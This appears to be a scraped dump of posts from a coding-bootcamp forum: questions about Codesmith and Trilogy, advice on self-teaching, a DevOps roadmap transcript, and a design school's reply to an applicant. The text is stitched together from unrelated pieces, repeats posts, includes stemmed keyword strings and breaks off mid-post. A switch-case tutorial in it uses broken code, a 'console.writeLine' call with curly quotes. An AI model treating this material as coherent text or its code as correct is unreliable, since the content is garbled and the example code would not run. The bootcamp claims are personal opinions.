What do you believe are my best resources to practice and study in preparation for getting accepted into, and being prepared for the full time course? I have already signed up for JS for Beginners, which the closest upcoming one begins February 12 and lasts until Feb 21st. Next I plan on taking CS Prep, however the  problem is that I can either take it Feb 14-28 (which would overlap with the JS for Beginners course although both are in Saturdays they would just end up being back to back) or Feb 28-March 14. It seems obviously to me to not overlap and take both at the same time, but with the technical interview of the nearest full time immersive being on March 5th, is it possible that I will be prepared to pass this interview before finishing CS Prep? It seems silly to me them scheduling the courses on these dates seeing as most students who plan to take the full time immersive will most likely take CS Prep to prepare for the closest upcoming course, but with the technical interview for full time being before the end of CS Prep will this be possible to do?

My last question is, besides these two courses, CSX, the slack channel, and the workshops offered (hard parts and Pair Programming), what other ways would be the best use of my time to prepare for the full time course? Should I take a specific Udemy Course on JavaScript that teaches what I won't learn in the JS for Beginners or CSX guides? Should I use Freecodecamp's JavaScript Algorithms and Data Structures (300 hours so not sure I will be able to complete in full)? Should I study or complete any specific parts of the p1xt guides? There are so many different resources out there but with my limited time, I feel only the students who have had experience with the program and know the admissions process can lead me in the right direction of what I really need to know and what may be a waste of time?

codingbootcamp,"I've been looking into Codesmith for a month now and can't find that many negative things about it online. But when I talk about their reported stats with my SE friends, they are very skeptical. Here are some points I discussed with a Codesmith advisor, his replies, and why I'm still skeptical:  


1) **Employment Rate:** I asked why Codesmith only has 85-90% employment rate. 1 out of 10 grads not finding a job seems high to me when the price-tag for tuition is so high. He sort of had a bullshit answer that some people aren't confident in their coding skills and have ""imposter syndrome."" I'm nervous that since I have no experience at this point I would be one of the ""1 in 10.""

2) **Senior &amp; Mid-level Engineers:** I asked how is it possible that someone can do a bootcamp and land a job at senior-level. He said those people had previous experience going into the bootcamp. However, I'm skeptical because if people are joining this bootcamp with that much experience, how can I join the same bootcamp with zero experience? (Even if I do plan on studying and doing their CS Prep before joining). My SE friend did tell me that if Codesmith really trains students to become ""T-Shaped"" engineers in Javascript, that maybe it is possible to enter as mid-level, but she still thinks senior level is very unlikely. 

3) **Salary:** The median starting salary at Codesmith is really so much higher than all other bootcamps...it's sort of crazy? Like why would I choose Flatiron over Codesmith when the starting salary at Codesmith is so much higher? 

4) **Time if Takes to Find a Job After Graduation:** He said it takes most graduates 3-6 months to find a full-time job. I thought that this is sort of a long time (especially if you're on the 6 month end of the spectrum). Codesmith advisor said getting a SE job can be time-consuming because of the number of interviews you need to do. Idk i'm still skeptical but what I'm assuming is that even after Codesmith, you still need to study a lot for technical interviews and teach yourself more coding to actually get a good job. 

Anyway, thank you so much for reading all of this. This is a huge life decision and huge investment so I'd like to make the right decision.

codingbootcamp,"Hello! A quick intro: I am 21F and studied social work in college and was able to land a job in the field, however, because of my extreme social anxiety I find the entire field to be very stressful and it's hard to cope with my anxiety.

codingbootcamp,"A bit about me: I have a CS degree and some limited SWE experience in industry developing full-stack features. Im currently not working.

I recently enrolled to a coding bootcamp with a scholarship. I enrolled in the bootcamp to find structure and discipline to practise coding to find my next job.

I'm finding the pace of the programme too slow. The curriculum is typically what you find online for a small cost. All my colleagues have no prior experience of coding.

I've kind of realised that if I cant find discipline/structure on my own independently, without the use of a classroom setting/bootcamp, then how will I ever succeed as a SWE in industry?

codingbootcamp,"I know there is a post about Trilogy every week here (huge red flag), but want to share something I just went through so others do not fall into the same trap I did. 

For those that do not know Trilogy Bootcamp is likely your local universities bootcamp. If you see something like ASU Full Stack Bootcamp or UCLA Coding Bootcamp that is likely Trilogy hiding under the brand of your local uni. They are generally hated on reddit and in other places. Some people have success with it, many feel like they were ripped off. 

I was trying to decide what bootcamp to go to and did an ""info session"" with an ""Admissions Counselor"" who was more of a salesman than anything. I fell into their trap and signed up. Within a few days I put $1k down and agreed to pay these people $500/mth for the next 24 months. I continued doing some research and continued finding new things about the bootcamp and noticing other red flags. The one red flag, on the pile of many, that finally pushed me over the edge was that I could not find any information about my instructor anywhere. Not on linkedin, twitter, anywhere. The thing that I had read the most was the instructor makes or breaks the class and if they break it Trilogy dgaf and your stuck with a shit education and a pile of debt. After talking with people on Reddit I discovered Resilient Coders and opted out of Trilogy. I'm out $1k, but I suppose that is better than $11k. My warnings for you all that are looking are:

1. Do your research on your own before you call for an ""information session"". These people are salesmen who are good at luring you in. Before you know it your enrolled in the program and it's too late for you to get your money back. If they are rushing you with things like ""there is only 2 seats left"" and ""I don't know when the next cohort will be"" run. 
2. If it smells like shit and looks like shit, and everyone tells you it's shit, it is probably shit. I made a lot of effort to ignore the warning signs because I wanted it to work out so bad. 
3. Ask who your instructor will be. 
4. Ask about the deposit refund policy before you put it down 
5. Ask if they report their job placement numbers (if not that is a huge red flag) 
6. Really think about what you want from a bootcamp. The point is to obtain skills, not slide your way into a job you're underqualified for. The value should always be in the education piece. If that piece is rocky or you will be relying on yourself to learn it, than why are you spending $10k-$30k? For someone to tell you what to learn? Udemy can do that for $10. 

I hope this is useful for others. Maybe me losing $1k will save a bunch of other peoples $1k which will make it at least somewhat worth it. I also want to acknowledge that I did not expect to get my deposit back, but in the case that someone does they can heed my warning.",For those who are thinking about Trilogy,"I know there is a post about Trilogy every week here (huge red flag), but want to share something I just went through so others do not fall into the same trap I did. 

For those that do not know Trilogy Bootcamp is likely your local universities bootcamp. If you see something like ASU Full Stack Bootcamp or UCLA Coding Bootcamp that is likely Trilogy hiding under the brand of your local uni. They are generally hated on reddit and in other places. Some people have success with it, many feel like they were ripped off. 

I was trying to decide what bootcamp to go to and did an ""info session"" with an ""Admissions Counselor"" who was more of a salesman than anything. I fell into their trap and signed up. Within a few days I put $1k down and agreed to pay these people $500/mth for the next 24 months. I continued doing some research and continued finding new things about the bootcamp and noticing other red flags. The one red flag, on the pile of many, that finally pushed me over the edge was that I could not find any information about my instructor anywhere. Not on linkedin, twitter, anywhere. The thing that I had read the most was the instructor makes or breaks the class and if they break it Trilogy dgaf and your stuck with a shit education and a pile of debt. After talking with people on Reddit I discovered Resilient Coders and opted out of Trilogy. I'm out $1k, but I suppose that is better than $11k. My warnings for you all that are looking are:

1. Do your research on your own before you call for an ""information session"". These people are salesmen who are good at luring you in. Before you know it your enrolled in the program and it's too late for you to get your money back. If they are rushing you with things like ""there is only 2 seats left"" and ""I don't know when the next cohort will be"" run. 
2. If it smells like shit and looks like shit, and everyone tells you it's shit, it is probably shit. I made a lot of effort to ignore the warning signs because I wanted it to work out so bad. 
3. Ask who your instructor will be. 
4. Ask about the deposit refund policy before you put it down 
5. Ask if they report their job placement numbers (if not that is a huge red flag) 
6. Really think about what you want from a bootcamp. The point is to obtain skills, not slide your way into a job you're underqualified for. The value should always be in the education piece.

codingbootcamp,"I know a lot of people ask, I’ve read some of the recommendations. But I’m struggling. 

I have tried some of the free information available but I just can’t seem to start grasping coding tutorials. I was looking at python because I hear it’s easy.

The DevOps Roadmap offers an opinionated path to learning the skills needed for a career as a DevOps engineer. There's a lot of ground to cover on this path, so let's get started. 

The top section of the DevOps Roadmap is like gearing up for the trip. Here we find programming languages, operating systems, and server management. These are good skills to pick up early on. 

The insights that come from knowing how to work with software and operating systems really come in handy when you're working with applications and the servers running those applications. 

For programming, Go is the recommended language, but Python, Ruby, and Node.js are also good options. 

And Linux is the clear choice for server management. The recommended distributions are Ubuntu, CentOS, Red Hat. This section also emphasizes learning Bash scripting, which is a great skill to have when it comes to automating processes at the system level. 

As we ease down the road, we reach the section of the path that introduces networking protocols and the services that use them like web servers, proxies, and load balancers. With networking being such a big part of the way our world is connected, knowing HTTP, SSL, and other protocols will be useful in deploying services. 

And web servers are great services to start with. NGINX and Apache are the favorites in this category. 

Coming around the bend from services, we land into the concepts and tools that are central to practicing DevOps and site reliability. Infrastructure as code, CI/CD, and Monitoring. And of course, every modern DevOps journey includes a visit to at least one Cloud provider. Terraform is the clear leader for working with Infrastructure as code, and with containers in this category, Kubernetes and Docker are key to working with container orchestration. To be honest, CI/CD is one of the favorite places on this journey because it involves working with tools like Jenkins, GitHub Actions, and GitLab CI. And when it comes to site reliability Monitoring is important, so we turn to tools like New Relic, Datadog, Grafana, and Prometheus. 

And no DevOps journey is complete without walking in the clouds. AWS is one of the most popular cloud services for DevOps engineers, but Google Cloud and Microsoft Azure are both viable cloud platforms to learn as well. 

There's a lot of information on this roadmap and I promise you, your path will not follow directly from top to bottom. There may be sections that you skip over completely and others that you work on at the same time. For example, if you're learning about Linux Operating Systems, is it likely that you might be working with virtual servers in the cloud. These two topics appear to be far apart on the map, but in reality, they're right next to each other. Also, don't feel like you have to know everything. Learn the skills and tools you need to know and when you can, make time for the ones you're curious about. This ties into the last stop of the path, the stop that says Keep learning. It's probably the most important stop of all because honestly, with technology changing at such a fast pace, a true DevOps journey never ends.",A Deep Dive into the DevOps Roadmap,"

Nucamp has a back end with Python but it doesn't seem very in-depth. All the bootcamps seem to be focused on JavaScript.Back End or Full Stack",change career nontech job software development probably structure experience working team project etc selfteaching free cheaper resource isnt personally landing job tough without c degree almost done sql course dabbled python tried basic html cs spent day friend backend developer watching work think back end stuff better didnt html havent done javascript friend said unmet demand java c programmer sql advice back end v full stack better full stack focus back end anybody back end kenzie java program 12 month nucamp back end python doesnt seem indepth seem focused javascriptback end full stack

codingbootcamp,"Hey Reddit!

Back in 2020 I had a lot of friends that got laid off due to covid19. Since, we're all stuck at home, I recommended that they should learn how to code so that they can get a remote job in tech that pays fairly decent for entry level roles. I found it kind of silly that even with all of the free resources out there, they still struggled to get started.

After binging a lot of animes, and getting tired of video games due to lockdown, I wanted to do something meaningful with my life. Hence, I offered to tutor my friends 1 on 1 starting in Nov 2020. It was a fun and interesting experience because I've always wanted to be a teacher, but I never had many opportunities to teach. So I took this very seriously, and I was amazed that I was able to help 1 friend starting in March 2021, land a full time gig at a fintech company after 6 months of hard work.

I was amazed because at the beginning, my friend was thinking of joining a bootcamp, which would have costed him around $10,000\~. However, I told him: ""let me try to teach you this, and let's see how far we can go."" He was hesitant at first, but I guess since the bootcamp didn't start until July 2021, he gave me a chance!

I started teaching this friend on March 2021, where we spent roughly 1-2 hours a week going over concepts, practice problems, and building out projects. One interesting trait about my friend was that he was very determined to get a job in tech, and he would be the one that asks me when we can do another lesson. This helped motivate me to continue to teach him, and before we knew it, 6 months went by and he was able to land a job in tech.

**What I learned from this experience:**

I learned that people can learn a lot and at a super fast pace, if they have a mentor to guide them through each step. I literally reviewed each piece of code he wrote to ensure that he was writing clean and concise code from day one. In addition, I made sure that he time boxed each practice problem so that way he doesn't spend more than an hour trying to figure out simple things like syntax / errors, which I think helped us move fast!

There were moments where my friend was doubtful, but as a mentor I made sure to give him pep talks to help motivate him to continue.

For example, there was this one time where he felt like giving up because he couldn't understand the concepts that I taught him. So clearly, maybe I wasn't explaining concepts clear enough, but I was super thankful for his feedback which helped me learn how to simplify concepts even further.

Obviously, learning something new like programming isn't an easy task. But, I'm grateful that he was able to stick through with the lessons and continued to want to learn more!

**A little bit about me:**

I have completed a Computer Science degree, and I am currently working full time as an iOS engineer. At first, I wasn't sure if what I taught was good enough, and I had imposter syndrome from day one. However, thanks to this friend, I guess I can confirm what I taught was useful as I was able to help him land a gig.

I have created a lot of course material, and I thought that it would be wasteful if it just collected dust in a corner. So now, I am opening the floor up and I would like to share the same resources that I taught my friend with the world :)

If you're considering a bootcamp, and would like a little taste of programming before joining one (or if you enjoy my teaching style). Feel free to join me on Youtube! Here is a link to the playlist: [https://www.youtube.com/watch?v=GJ0p1uQVHzA&amp;list=PLEcHbCIBlyJryQxxElze2C\_xMHLAJW94C](https://www.youtube.com/watch?v=GJ0p1uQVHzA&amp;list=PLEcHbCIBlyJryQxxElze2C_xMHLAJW94C)

The way I structure the course is very straightforward. My goal isn't to teach every little detail of programming. Rather, I want to focus on the key stuff that I believe is important to land a job ASAP. In addition, I want to make this super accessible where people don't need to scatter the internet to piece knowledge together.

This is how the course is currently structured:

1. Learn the basics of programming in python
2. Learn web development / full stack
3. Start building projects / portfolio :)

I am currently recording the lessons, and I have completed up to lesson 15, and we are almost finished with part 1, which is the basics of programming in python :)

Anyways, if you read this far. I hope you the best of luck on your programming journey!",I taught a friend how to code part time for 6 months and he was able to land a job in tech!,"Hey Reddit!

codingbootcamp," If you are a job seeker, job interviews can be stressful, especially if you don’t feel fully ready for the interview. A mock interview can be useful to reduce the stress of your interview process before you are in front of real companies.

  
**Benefits of A Mock Interview:**

### 1. Help candidates reduce their stress and anxiety before a real job interview.

Suppose you are:

* A junior IT job seeker,
* A newcomer to the IT field
* Feel that you are not fully confident in your interviewing skills

Practicing your interviewing skills (starting as soon as possible) is really an excellent opportunity for you to gain confidence. For those who are unsure about their foreign language speaking level, IT technical skills, or are intimidated by the (sometimes) tricky behavioral questions, mock interviews are just for you to improve these skill sets.Make sure that you practice with someone with IT experience and/or a skilled interviewer. As these types of people can give you the best feedback on whether your answers are suitable for the specific interview questions that will be asked. In this way, you are gaining real experience and learning the proper answers for future interview questions. That will help dramatically reduce the amount of stress on our back.

### 2. Help you boost your confidence.

As you practice, you will learn the answers to the most common interview questions and you will get feedback about your weaknesses and strengths. This will help you to feel comfortable when it comes time to conduct actual interviews. In addition, being confident about your skills and knowing about do’s and don’ts for the interviews will make you perform better in an actual interview..

### 3. Provide you with useful feedback in a low-stress environment.

In a real interview, you will not receive any feedback about your interviewing abilities. If you aren’t performing well, you likely will never know about it. However, a mock interview in a friendly atmosphere can support you in getting clear about your shortcomings, so that you can correct them before the real thing. So it is clear that a mock interview is an excellent opportunity to help you find your dream job much faster than you would trying to do this on your own.

### 4. Help you prepare for behavioral-based interview questions.

Many companies use “BI(Behavioral Interviewing)” questions to help them identify the proper candidates for their positions. These questions are trying to tease out which candidates have the best people skills to mesh with their company culture. These are the little details that you can practice and refine during your mock interview process.Do not hesitate to take advantage of mock interviewing opportunities even if you think your skills and experience are enough for the market. Everyone has tools that they can work on developing to make an even better impression on a potential employer.

codingbootcamp,"Hi, subreddit, 

**TL;DR Would greatly appreciate any comment/discussion that may provide some guidance on FA-powered university boot camps.**

I am transitioning from my early career in the social sciences academia and museum industry - and so glad to have stumbled upon here. 

I have read of horrid Trilogy experiences mentioned across numerous posts and comments, as well as the looming criticisms against university boot camps in general as ""for-profit.""

Though I am still curious about folks' experiences in these FA ""powered"" boot camps, I doubt Trilogy runs this since this is advertised on [FAs own website](https://www.fullstackacademy.com/university-partners). As an SJSU alumni, I am heavily considering the one on the SJSU campus (small discount) and understanding that it's a 12-week program compared to the normal 17 weeks FA immersive. From my reading, the biggest difference is that the SJSU offering does not include the individual and group projects that would normally run between 12-17 weeks of the FA immersive (hence the cheaper price).

The main difference though between Trilogy and other mid tier boot camps that I have found is that most of their graduates that I have looked at on LinkedIn seem to be getting hired more so than those from boot camps like Nucamp. The overarching theme of these boot camps seems to be you get what you put in. As someone who knows enough to keep up and is willing to develop my skills beyond the in class projects, will Trilogy be throwing money in a fire? Does any one have any positive stories/outcomes from one of their boot camps?  Negative outcomes/experiences are welcome as well as I want to know both sides, just seems to be a disconnect between what I am seeing on Reddit vs what I am seeing on other sites.Has Anyone Here Had a Good Experience With Trilogy?",selfteaching year decided route hone skill stay structured show paper completed kind legitimate foundational education researching area trilogy seems mixed review took aptitude test interviewed phone considering signing red flag ease aptitude test as kissing called interviewsales pitch red flag unfortunately turning standard practice looked review trilogy every wildly mixed got job finished bad scam seen trilogy universally hated reddit main difference though trilogy mid tier found graduate looked linkedin seem getting hired nucamp overarching theme seems put someone enough keep willing develop skill beyond class project trilogy throwing money fire positive storiesoutcomes negative outcomesexperiences welcome well side seems disconnect seeing reddit v seeing siteshas experience trilogy
codingbootcamp,"I know that labels mean something in this world, but I don't know which label on a resume would have a better chance of getting hired. For example, would it mean more to have the UIC Extension (powered by Fullstack) or Northwestern Extension (Trilogy, but upon reading posts here I know not to go to this one) on your resume compared to a place like General Assembly, Fullstack (without the university label attached), or Coding Temple? 

However, for UIC, NW and a few other ""university-sponsored"" camps I've looked at, their programs seems less rigorous (10am-2pm five days a week instead of 9am-5pm that I've seen for other full-time 12 week programs). It also seems that General Assembly is the only group potentially offering in-person classes next year, and if I did a camp I'd 100% prefer to go in-person. But I think I'm leaning towards GA in general because I've attended so many of their free virtual events and have am familiar with them.

I'm curious what y'alls opinions would be on whether or not it's worth it for me to bother with a bootcamp. I graduated less than 2 weeks ago but I'm struggling a bit with technical interviews. I can't tell if they're supposed to be this hard or if I'm just stupid and inadequate. 

I'm not hurting financially but experiencing enough anxiety about employment that I feel like I have to rush to the next step by immediately signing up for a bootcamp or one of the shitty indentured servitude companies like Revature just so I can keep moving forward.

codingbootcamp,"For any other potential job, quitting your current job and studying from “full time” to 90 hours a week for a few months expecting to get a full time job that pays all the bills sounds insane. I’ve worked 90 hour weeks bartending making a butt load of money but by the end I felt like a zombie. When I was in college full time I never would have studied for 90 hours a week. Not because I lacked the discipline, but because I knew my puny human brain could only take so much before studying more was useless. Why is that normalized in bootcamps? 
I get that the “best” or “most efficient” way to learn something like a new speaking language is to move to where only that language is spoken and immerse yourself in it but does it really work that way for programming too?
Why aren’t people more interested in the part time bootcamps that expect you to put in 18-22 hours a week for 9-12 months? It would seem like that would give you much more time to let the lessons sink in and for you to apply them in your personal projects. And you can keep your job and current income levels while working toward something better. Does that sound crazy?

I’m thinking it is one or two major reasons but feel free to correct me if I’m wrong.
1. Coding bootcamps have figured out the fastest and most efficient way to get money out of the most amount of people while being able to say they exposed the students to all of the material is to have cohorts every 3-4 months. Capitalism at its finest. They have a marketing budget to spend on promoting these short term full-time programs so that’s what everyone hears about.
2. People are desperate and impatient to change jobs into “tech” and bootcamps are a path of least resistance compared to getting a 4 year CS degree. It is faster and “harder” and the students are assuming that they will retain more than they forget by the end.

A little background on me:
29 M, US based, Bachelors in psychology, lifetime server/bartender, started teaching myself coding October 2021 using freecodecamp, Codecademy, and The Odin Project (currently 50% through the foundations), Angela Yu’s 100 days of code, and I have Colt Steele’s The Web Developers Bootcamp 2022 as well as Automate the Boring Stuff that I haven’t started yet. I’m also set to begin freecodecamp’s free online bootcamp starting January. I learn best in a structure outside of myself so I will be taking some type of bootcamp once I feel I’m hitting a plateau of what I can teach myself using these resources. I’m thinking Codesmith but we’ll see. I would appreciate any insight you all can provide, but I prefer to learn from the personal experience of others rather than “I read on career karma bootcamp X is good”. I’ve already read on career karma that every bootcamp is the best there ever was lol.

TLDR: Why is quitting your job and working on a bootcamp for 60-90 hours for 3-4 months somehow better than doing a part-time 18-22 hour bootcamp?",Why is everyone obsessed with 3-4 month bootcamps?,"For any other potential job, quitting your current job and studying from “full time” to 90 hours a week for a few months expecting to get a full time job that pays all the bills sounds insane. I’ve worked 90 hour weeks bartending making a butt load of money but by the end I felt like a zombie. When I was in college full time I never would have studied for 90 hours a week. Not because I lacked the discipline, but because I knew my puny human brain could only take so much before studying more was useless. Why is that normalized in bootcamps? 
I get that the “best” or “most efficient” way to learn something like a new speaking language is to move to where only that language is spoken and immerse yourself in it but does it really work that way for programming too?
Why aren’t people more interested in the part time bootcamps that expect you to put in 18-22 hours a week for 9-12 months? It would seem like that would give you much more time to let the lessons sink in and for you to apply them in your personal projects. And you can keep your job and current income levels while working toward something better. Does that sound crazy?

I’m thinking it is one or two major reasons but feel free to correct me if I’m wrong.
1. Coding bootcamps have figured out the fastest and most efficient way to get money out of the most amount of people while being able to say they exposed the students to all of the material is to have cohorts every 3-4 months. Capitalism at its finest. They have a marketing budget to spend on promoting these short term full-time programs so that’s what everyone hears about.
2. People are desperate and impatient to change jobs into “tech” and bootcamps are a path of least resistance compared to getting a 4 year CS degree. It is faster and “harder” and the students are assuming that they will retain more than they forget by the end.

A little background on me:
29 M, US based, Bachelors in psychology, lifetime server/bartender, started teaching myself coding October 2021 using freecodecamp, Codecademy, and The Odin Project (currently 50% through the foundations), Angela Yu’s 100 days of code, and I have Colt Steele’s The Web Developers Bootcamp 2022 as well as Automate the Boring Stuff that I haven’t started yet. I’m also set to begin freecodecamp’s free online bootcamp starting January. I learn best in a structure outside of myself so I will be taking some type of bootcamp once I feel I’m hitting a plateau of what I can teach myself using these resources.

I am a homemaker and am seeking a new career. I realized that I don't like teaching after spending 3 years on my master's program in education. I was depressed for awhile because I blamed myself on choosing a wrong career after spending so much $$ and time. My therapist helped me to get out of the situation and I started to learn coding by myself in the last few months and I found I like it. Now I am thinking to find a bootcamp to learn deeper and change my career.

codingbootcamp,"Recently got accepted to Tech Elevator in Cincinnati and I’m super excited about the opportunity… they have financing options available and one is an ISA (income share agreement).

codingbootcamp,"Overall: Disappointed.

Everything you will learn is already online and packaged better. It's almost the same as freecodecamp, codecademy, etc. Probably more similar to The Odin Project. Why? Little instructor support leads to googling for hours. However, TOP is structured better.

Our responsive design section lasted in total less than 1.5 hours and no questions were fielded. I understand if we were all experienced devs but it seems odd to cover css selectors and then go straight into building an app. A lot isn't covered or merely mentioned.

About me: 35, College Degree, Exit, self taught for roughly a year. Before my company, I was in sales.

If you don't have the fundamentals you should not consider it. I'm talking decent JavaScript.  I don't know how other bootcamps are structured but this one goes from what is html to a full stack DJANGO app in a few weeks. Pretty sure we never covered git or the terminal. Instructor would get annoyed if someone had a question about cloning a repo.

My JavaScript is okay. Functions were glossed over and their lectures on JS left me confused. 

&amp;#x200B;

The Good: **learn or die**. It's up to you to figure it out. Unlike self taught, there is a deadline so you will be forced to do. This was helpful.

The Bad: **riff raff**. I hate to be an internet jerk. But it seems to me they found a bunch of washed-up or never-were devs to run through some slides to a hopeful and naive/ill-informed group.

&amp;#x200B;

I'm posting this because if you are reading this you are probably like me. I went down the rabbit hole of bootcamps and came here quite a bit. I was on the fence and decided to go for it. While it didn't hurt I don't think it helped very much. I believe you're better off figuring it out at your own speed so it clicks. You can't breeze through react in a day.

**Switch case can be used for multiple cases scenario’s.**

**Ex:-** If you have multiple conditions on the basic of which you would determine something then switch case is the ideal for these kind of queries.

Working example :-

**Query:- If number entered is 1 then print ONE, if 2 then TWO and if it is 3 then THREE.**

**Using switch**

1. switch(identifierForUserValue) 
2. { 
3. case 1:  console.writeLine(‘ONE’) 
4. break; 
5. case 2: console.writeLine(‘TWO’) 
6. break; 
7. case 3: console.writeLine(‘THREE’) 
8. break; 
9. default : console.writeLine(‘Wrong input’) 
10. break; 
11. } 

**Note:-** Yes you can use multiple ***‘If conditions’*** as well but ***‘Switch’*** handle these kind of queries in a better way. In addition of that it has a **‘*****default’*** case as well which executes when no case matches

I hope you understand now.

I technically didn't even pass but the asshat of a teacher of course let me pass because he didn't want to get any flak from the school.

I'm really worried about finding a career as I'm getting older and have been trying to learn again. This time by my self because I'm not great I'm a class setting and also don't have the money either way.

I just started code academy free course but from anyone with experience with it..is it enough?

I know there are many other free courses but which do you guys recommend? Or any programs that's worth paying a bit of money for(in the hundreds at the most)?

I do enjoy learning but there's no doubt I ""learn"" differently from most other people.  I don't know if it's my anxiety or ADHD but I think after my first experience in a class setting I'd definitely rather learn by my self.

I'm not sure if this belongs here so I apologize if it doesn't. I'm currently trying to decide if I should get an MBA or sign up for a coding bootcamp. To give a little bit of context on me, I'm 29 and I double majored in economics and sociology and I minored in math. I struggled with programming in college (only one class), but I went to a borderline elite college where they taught things very rigorously. I'm in a major metro area that is not SF or Seattle. To be transparent, my main goal is money. I probably have a good chance at the elite (top 15) MBA programs, but I'm wondering if coding might be the better financial decision. Would any past bootcamp grads specifically be willing to comment their salary history by job as well as the metro area they are in? I've seen online that ""experienced"" bootcamp graduates make ""only"" 95k (ish) at their third job and I make almost that much now in a separate field.

codingbootcamp,"Hi all! Looking for some advice

As a little background, I graduated with a bachelors in psychology. My school asked us to complete another area of sub-study where I took marketing and some intro CS courses. When I graduated I started working in digital marketing where I became the head of web changes at the small company I worked for. The web changes were VERY basic but I really enjoyed doing it, more than some of the other stuff I was doing.  I’m wanting to continue front-end development but eventually move into full-stack. I also have a photography and graphic design portfolio which is limited but still something I have knowledge and skills of. 

I’m considering doing the UIC coding bootcamp which is partnered with fullstack academy ( I think they were bought out?) I’ve read so many positive and negative reviews on bootcamps so I’m not so much looking for general advice as advice specific to my situation.

NOW, my questions lol
- will a bootcamp be a good supplement to my current resume/portfolio? 
-is it common for companies to look for front-end coders with marketing &amp; design experience? or does the marketing &amp; design experience not even matter?
- is it possible to be a full-stack engineer without a CS degree? although I wouldn’t be opposed to going back to school for one if I landed a solid job in the field
- will my previous experience help land me a job out of bootcamp?

codingbootcamp,"I run a small design/dev school. It's a lot of work, but I love it.

Part of my job is to respond to student applications/screeners. Ivy and I try to write the replies together when possible.

Most of the time, people are genuine and they don't mind spending 20 minutes filling out a form. After all, it's in exchange for a really personal (free) career guidance session.

But wow - there's a lot of angst out there! And we get a lot of fake people, other boot camps, and just a lot of angry people. It's a lot of work / and we're starting to understand why the bigger named schools have such a large staff - and why they are so expensive. 

If we all hate ""the man"" - but also / everyone is *the man* \- and *everything* in the world is a skeezy sales pitch / but everyone wants to work for *the man* \- then how are we going to live our lives, Reddit? If we crowd out even the most honest and hard-working people - in favor of faceless corporations... where will we be? How can you seek a job (with payment) but refuse to ever pay for anything? This is our new *American Way*.

&amp;#x200B;

**Here is one from this morning:** 

(we use the screener as a way to introduce *user research* as well)

(I have no idea why anyone would want to read this... but it took so long to write up / I figured it could at least lead to some interesting conversation)  


\---  


Hi, REDACTED. 

You seem like you're wound pretty tight! But we're still going to look at your screener and leave notes like we do for everyone else.

We get a Slack notification with just a few key answers - and we can already tell this is going to be a weird one!  


**#8: Without scrolling around too much...**

*Applicant*: The site is engaging but a bit lacking in identity

*Us (our email response)*: It's pretty loose. We'd agree. We use it as a talking point for that reason / and the students work on improving the various modules as part of the class. We talk a lot about visual language and how to unify things visually. We're OK with how it looks / and using it in that process. Most normal people either like it or don't. They aren't usually educated enough to have much to say about it *yet.* It's fun to see the students come around and start to think about it more critically.

&amp;#x200B;

**#9: Is this company:** (range of new, established, etc)

*Applicant*: Brand new

&amp;#x200B;

**#10: How can you tell?**

*Applicant*: No menu bar. Trying really hard to sell me something while ""not trying"" to sell me anything. The ""this is a call to action!"" line is a prime example. Also points are kind of ""repeated"" or drawn out for too long. Has the vibe of being a 1 - 2 man operation

*Us*: We've never thought of a 'menu bar"" as being a signifier that a  company is brand new. Very interesting. We think that conventions like menus are something to think through. Are they necessary when there's only a few links? How do you want to tell the story? Do the masses really know what 'hamburger' menus are? Would your mom know to click it?

This is a landing page. Its goal is to explain the program and sell you on its value. That's its goal. What would be your suggestions on how to better accomplish that goal?

  
**#11: What type of company is this anyway?**

*Applicant*: a front-end boot camp, with a twist(s).

&amp;#x200B;

**#12: What does this company ""do?""**

*Applicant*: Teach the entire web design and development process (research, content-strategy, User Experience, and programming - for The Web)  


**#13: How would you describe the 'Character' of this company?** (multiple choice)

*Applicant*: Graphic Design College, Down to earth, Homemade  

*Us*: This is interesting. It sounds like you don't like the site \[\[based on other responses\]\] - but somehow it feels like a graphic design college. That sounds impressive!  We are happy to appear down to earth and homemade. If that is our goal /  then our design is successful.

&amp;#x200B;

**#20: What VALUE would a student get out of this course?** 

*Applicant*: The value this course provides is a strong focus on an area of work. Many courses are fine delineating the line between Compsci and full-stack but are not willing to truly flesh out the experience. They seemingly always leave something out, whereas here you are (hopefully) taught the entire process from start to finish.

&amp;#x200B;

**#23: How confident are you in the teachers?**

*Applicant*: 0 out of 10

*Us*: We probably wouldn't fill out a form / or eat a sandwich / or spend a  single second on anything that didn't feel &gt;= 8/10.  Why did you decide to fill out this form at all? Do you fill out a lot of forms? Is this type of competitor research something you find interesting? Because there are jobs for that.

&amp;#x200B;

**#35: What teaching style do you prefer?**  (multiple choice) 

*Applicant*: Learn on your own from bad videos, make bad habits, and meet with a 'mentor' for 30 minutes a week, Be on video chat with an obnoxious team of developers for 4 hour periods at a time?80 hours a week full-throttle automated test-driven challenges with no wiggle room, Watch a random teacher's assistant stumble through building a brittle web application, Watch hundreds of hours of Udemy courses by yourself - but pay thousands instead of $15.99, Go to a school of a bunch of really excited young people and get a certificate that no one cares about

*Us*: At this point / we can tell that you are just very impatient. These things (these specific questions/prompts) aren't for *you.* They are for the people who don't know better. 95% of the applicants say that this form was ""fun"" - and that ""It gave them a lot to think  about."" It's not for you. And we'd expect someone who is that aware of it --- to understand that. There are tons of people being taken advantage of who aren't educated or cultured enough to even consider these decision points. It's also a little snarky (on our part) - but that's our choice. However  - in the small chance you really do want these things - you can head over to Career Karma. There's a ton of schools that offer this. And they won't pretend they aren't salespeople.

(*there were many more questions answered like this*)

&amp;#x200B;

**#39: What do you think about this form?**

*Applicant*: Was annoying answering questions where there are clear and obvious ""correct"" answers. Like obviously I want a good learning experience vs ""80 hour non-stop no wiggle room chaos"" learning experience. I already read the talking points on the website, why am I forced to read then all again under the guise of questions and answers

*Us*: We spend an insane amount of time doing this. If someone isn't willing to take part in a 20-minute experiment without freaking out / then we know they aren't going to be a good fit. It's a lot less expensive for us. If you want us to spend an hour talking with you - *for free*  (2 of us) - which is $200 worth of time... - / we aren't forcing anyone to do anything. This is the student screener. It is your choice to fill it out. And like we said, it's very telling how you react.

&amp;#x200B;

**#10: How can you tell?**

*Applicant*: No menu bar. Trying really hard to sell me something while ""not trying"" to sell me anything. The ""this is a call to action!"" line is a prime example. Also points are kind of ""repeated"" or drawn out for too long. Has the vibe of being a 1 - 2 man operation

*Us*: Back to this. We're still trying to figure out where the ""selling"" and the ""not selling"" - and this call to action is. We really can't find it.  It just says what the course is. If anything - in too much detail. It's very bland. Here's what we do. It's very humble. It has Derek right there - just saying how it works / all out in the open on video. and it's not trying to pretend it isn't a 2-3 person operation. It shows us right in the videos. We'd love to hear more about this.

&amp;#x200B;

**#40: So, who are you? Why are you here? What's your back story?**

*Applicant*: I just love computers and technology. Always wanted to work in the field. Found out college won't work for me, so have been figuring out how to proceed next.

&amp;#x200B;

